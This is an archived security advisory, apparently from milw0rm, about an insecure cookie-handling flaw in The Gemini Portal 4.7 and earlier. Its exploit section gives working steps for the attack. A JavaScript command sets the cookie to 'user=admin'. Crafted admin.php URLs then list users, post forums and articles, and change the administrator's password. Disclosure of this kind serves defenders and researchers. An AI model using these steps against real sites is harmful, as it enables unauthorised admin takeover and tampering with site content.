<html><head><title>The Gemini Portal <= 4.7 Insecure Cookie Handling Vulnerability</title></head><pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
The Gemini Portal &lt;= 4.7 / Insecure Cookie Handling Vulnerability 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Program: The Gemini Portal
Version: &lt;= 4.7
File affected: admin/*
Download: http://www.arzdev.com/downloads/1/Gemini


Found by Pepelux &lt;pepelux[at]enye-sec.org&gt;
eNYe-Sec - www.enye-sec.org


&gt;&gt; Program description (by the author website) &lt;&lt;

The Gemini Portal 4 is the most scalable, dynamic, and powerful content 
management system there is. It is perfect for large business network services, 
to the simple personal web site for use with PHP and MySQL.', 'The Gemini 
Portal is a dynamic content management system. It is ideal for any size 
community, allowing users, moderators, limited admins, and global admins log 
in. Many of the built in pages use the dynamic database file system (ArzFS) 
to manipulate files and folders.


&gt;&gt; Bug &lt;&lt;

You can access to the admin panel altering the cookie and adding a parameter
in the navigation bar.


&gt;&gt; Exploit &lt;&lt;

Note: POST is not checked and you can enter all by GET. Also you can create a
simple perl script to send GET and POST packages.

First step: javascript:document.cookie = &quot;user=admin&quot;

Second step: navigate by the admin panel adding the parameter '&amp;name=users' in 
the navigation bar. Examples: 
    
	to view the main admin panel:
	http://site/admin.php?page=main&amp;name=users

	to list all forums:
	http://site/admin.php?page=forums&amp;name=users

	to post a new forum:
	http://site/admin.php?page=forums&amp;name=users&amp;page=forums&amp;op=newf&amp;fview=Everyone&amp;fpost=Everyone&amp;forumname=WHAT_YOU_WANT&amp;descrip=WHAT_YOU_WANT

	to list articles:
	http://site/admin.php?page=articles&amp;name=users

	to create a new article:
	http://site/admin.php?page=articles&amp;name=users&amp;op=newd&amp;dtitle=WHAT_YOU_WANT&amp;ppcontent=WHAT_YOU_WANT&amp;dfolder=0&amp;category=1&amp;autor=admin

	to list all users:
	http://site/admin.php?page=users&amp;name=users

	to edit the admin profile (you can change the admin password)
	http://site/admin.php?page=users&amp;op=edi&amp;uid=2&amp;name=users

# milw0rm.com [2008-09-26]</pre></html>